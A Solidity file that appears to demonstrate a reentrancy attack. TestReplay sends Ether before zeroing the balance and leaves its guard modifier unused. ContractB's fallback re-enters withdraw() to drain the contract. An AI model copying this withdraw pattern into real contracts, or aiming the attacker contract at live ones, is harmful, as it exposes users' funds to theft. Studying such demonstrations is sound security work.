// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract TestReplay {
    mapping(address => uint) public deposits;
    bool public locked;

    function deposit() public payable {
        deposits[msg.sender] += msg.value;
    }

    function withdraw() public {
        (bool success, ) = msg.sender.call{value: deposits[msg.sender]}("");
        deposits[msg.sender] = 0;


        require(success, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    modifier noReentrancy() {
        require(!locked, "No reentrancy");

        locked = true;
        _;
        locked = false;
    }
}

contract ContractB {
    TestReplay public a;

    constructor(address _a) {
        a = TestReplay(_a);
    }

    // 
    fallback() external payable {
        if (address(a).balance >= 1 ether) {
            a.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        a.deposit{value: 1 ether}();
        a.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
